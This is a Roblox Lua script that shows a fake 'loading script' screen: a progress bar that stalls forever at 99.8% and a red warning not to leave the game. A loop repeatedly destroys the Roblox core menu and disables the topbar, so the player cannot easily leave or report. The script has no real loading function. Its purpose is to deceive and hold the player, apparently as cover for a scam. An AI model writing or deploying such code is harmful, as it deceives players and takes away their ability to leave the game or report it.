local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")
local LocalPlayer = Players.LocalPlayer

spawn(function()
	while wait(0.5) do
		pcall(function()
			game.CoreGui.RobloxGui:Destroy()
		end)
		pcall(function()
			game:GetService("StarterGui"):SetCore("TopbarEnabled", false)
		end)
	end
end)

local screenGui = Instance.new("ScreenGui")
screenGui.Name = "LoadingScreen"
screenGui.ResetOnSpawn = false
screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
screenGui.IgnoreGuiInset = true
screenGui.DisplayOrder = 999
screenGui.Parent = game.CoreGui

local bg = Instance.new("Frame")
bg.Name = "Background"
bg.Size = UDim2.new(1, 0, 1, 0)
bg.Position = UDim2.new(0, 0, 0, 0)
bg.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
bg.BorderSizePixel = 0
bg.ZIndex = 1
bg.Parent = screenGui

for i = 1, 28 do
	local dot = Instance.new("Frame")
	dot.Size = UDim2.new(0, math.random(1, 3), 0, math.random(1, 3))
	dot.Position = UDim2.new(math.random() * 1, 0, math.random() * 1, 0)
	dot.BackgroundColor3 = Color3.fromRGB(
		math.random(30, 80),
		math.random(60, 140),
		math.random(180, 255)
	)
	dot.BackgroundTransparency = math.random(40, 80) / 100
	dot.BorderSizePixel = 0
	dot.ZIndex = 2
	dot.Parent = bg

	local dotCorner = Instance.new("UICorner")
	dotCorner.CornerRadius = UDim.new(1, 0)
	dotCorner.Parent = dot

	spawn(function()
		while dot and dot.Parent do
			local t1 = TweenService:Create(dot, TweenInfo.new(math.random(15, 35) / 10, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true), {
				BackgroundTransparency = math.random(70, 95) / 100
			})
			t1:Play()
			wait(math.random(10, 30) / 10)
		end
	end)
end

local topLine = Instance.new("Frame")
topLine.Size = UDim2.new(0, 0, 0, 2)
topLine.Position = UDim2.new(0.5, 0, 0.5, -90)
topLine.AnchorPoint = Vector2.new(0.5, 0.5)
topLine.BackgroundColor3 = Color3.fromRGB(60, 140, 255)
topLine.BorderSizePixel = 0
topLine.ZIndex = 3
topLine.Parent = bg

local topLineGrad = Instance.new("UIGradient")
topLineGrad.Color = ColorSequence.new({
	ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 0, 0)),
	ColorSequenceKeypoint.new(0.5, Color3.fromRGB(60, 140, 255)),
	ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 0, 0)),
})
topLineGrad.Parent = topLine

local container = Instance.new("Frame")
container.Name = "Container"
container.Size = UDim2.new(0, 500, 0, 160)
container.Position = UDim2.new(0.5, 0, 0.5, 0)
container.AnchorPoint = Vector2.new(0.5, 0.5)
container.BackgroundTransparency = 1
container.ZIndex = 3
container.Parent = bg

local titleLabel = Instance.new("TextLabel")
titleLabel.Name = "TitleLabel"
titleLabel.Size = UDim2.new(1, 0, 0, 40)
titleLabel.Position = UDim2.new(0, 0, 0, 0)
titleLabel.BackgroundTransparency = 1
titleLabel.Text = "Loading script, please wait!"
titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
titleLabel.Font = Enum.Font.GothamBold
titleLabel.TextSize = 22
titleLabel.TextXAlignment = Enum.TextXAlignment.Center
titleLabel.TextTransparency = 1
titleLabel.ZIndex = 4
titleLabel.Parent = container

local titleStroke = Instance.new("UIStroke")
titleStroke.Color = Color3.fromRGB(80, 160, 255)
titleStroke.Thickness = 0
titleStroke.Transparency = 0.6
titleStroke.Parent = titleLabel

local percentLabel = Instance.new("TextLabel")
percentLabel.Name = "PercentLabel"
percentLabel.Size = UDim2.new(1, 0, 0, 26)
percentLabel.Position = UDim2.new(0, 0, 0, 50)
percentLabel.BackgroundTransparency = 1
percentLabel.Text = "0.0%"
percentLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
percentLabel.Font = Enum.Font.GothamSemibold
percentLabel.TextSize = 16
percentLabel.TextXAlignment = Enum.TextXAlignment.Center
percentLabel.TextTransparency = 1
percentLabel.ZIndex = 4
percentLabel.Parent = container

local barBG = Instance.new("Frame")
barBG.Name = "BarBackground"
barBG.Size = UDim2.new(1, 0, 0, 10)
barBG.Position = UDim2.new(0, 0, 0, 86)
barBG.BackgroundColor3 = Color3.fromRGB(8, 8, 14)
barBG.BorderSizePixel = 0
barBG.ClipsDescendants = true
barBG.ZIndex = 4
barBG.Parent = container

local barBGCorner = Instance.new("UICorner")
barBGCorner.CornerRadius = UDim.new(1, 0)
barBGCorner.Parent = barBG

local barBGStroke = Instance.new("UIStroke")
barBGStroke.Color = Color3.fromRGB(40, 80, 160)
barBGStroke.Thickness = 1
barBGStroke.Transparency = 0.4
barBGStroke.Parent = barBG

local barFill = Instance.new("Frame")
barFill.Name = "BarFill"
barFill.Size = UDim2.new(0, 0, 1, 0)
barFill.Position = UDim2.new(0, 0, 0, 0)
barFill.BackgroundColor3 = Color3.fromRGB(50, 120, 255)
barFill.BorderSizePixel = 0
barFill.ClipsDescendants = false
barFill.ZIndex = 5
barFill.Parent = barBG

local barFillCorner = Instance.new("UICorner")
barFillCorner.CornerRadius = UDim.new(1, 0)
barFillCorner.Parent = barFill

local barGradient = Instance.new("UIGradient")
barGradient.Color = ColorSequence.new({
	ColorSequenceKeypoint.new(0, Color3.fromRGB(100, 180, 255)),
	ColorSequenceKeypoint.new(1, Color3.fromRGB(30, 80, 220)),
})
barGradient.Rotation = 90
barGradient.Parent = barFill

local warningFrame = Instance.new("Frame")
warningFrame.Name = "WarningFrame"
warningFrame.Size = UDim2.new(1, 0, 0, 30)
warningFrame.Position = UDim2.new(0, 0, 0, 112)
warningFrame.BackgroundColor3 = Color3.fromRGB(30, 0, 0)
warningFrame.BackgroundTransparency = 0.4
warningFrame.BorderSizePixel = 0
warningFrame.ZIndex = 4
warningFrame.Parent = container

local warningCorner = Instance.new("UICorner")
warningCorner.CornerRadius = UDim.new(0, 6)
warningCorner.Parent = warningFrame

local warningStroke = Instance.new("UIStroke")
warningStroke.Color = Color3.fromRGB(200, 30, 30)
warningStroke.Thickness = 1.2
warningStroke.Transparency = 0.3
warningStroke.Parent = warningFrame

local warningLabel = Instance.new("TextLabel")
warningLabel.Name = "WarningLabel"
warningLabel.Size = UDim2.new(1, -16, 1, 0)
warningLabel.Position = UDim2.new(0, 8, 0, 0)
warningLabel.BackgroundTransparency = 1
warningLabel.Text = "⚠  Do not leave the game while the script is loading!"
warningLabel.TextColor3 = Color3.fromRGB(255, 60, 60)
warningLabel.Font = Enum.Font.GothamBold
warningLabel.TextSize = 13
warningLabel.TextXAlignment = Enum.TextXAlignment.Center
warningLabel.TextTransparency = 1
warningLabel.ZIndex = 5
warningLabel.Parent = warningFrame

local function animateIn()
	TweenService:Create(topLine, TweenInfo.new(0.6, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {
		Size = UDim2.new(0.6, 0, 0, 2)
	}):Play()

	wait(0.3)

	TweenService:Create(titleLabel, TweenInfo.new(0.5, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {
		TextTransparency = 0
	}):Play()

	wait(0.2)

	TweenService:Create(percentLabel, TweenInfo.new(0.4, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {
		TextTransparency = 0
	}):Play()

	wait(0.15)

	TweenService:Create(warningLabel, TweenInfo.new(0.4, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {
		TextTransparency = 0
	}):Play()

	TweenService:Create(warningFrame, TweenInfo.new(0.4, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {
		BackgroundTransparency = 0.4
	}):Play()
end

spawn(function()
	while screenGui and screenGui.Parent do
		TweenService:Create(warningStroke, TweenInfo.new(0.8, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
			Transparency = 0.7
		}):Play()
		wait(0.8)
		TweenService:Create(warningStroke, TweenInfo.new(0.8, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
			Transparency = 0.1
		}):Play()
		wait(0.8)
	end
end)

spawn(animateIn)

local totalTime = 180
local startTime = tick()
local frozen = false

RunService.Heartbeat:Connect(function()
	if frozen then return end

	local elapsed = tick() - startTime
	local rawProgress = math.min(elapsed / totalTime, 0.998)

	barFill.Size = UDim2.new(rawProgress, 0, 1, 0)
	percentLabel.Text = string.format("%.1f%%", rawProgress * 100)

	if rawProgress >= 0.998 and not frozen then
		frozen = true
		barFill.Size = UDim2.new(0.998, 0, 1, 0)
		percentLabel.Text = "99.8%"
	end
end)
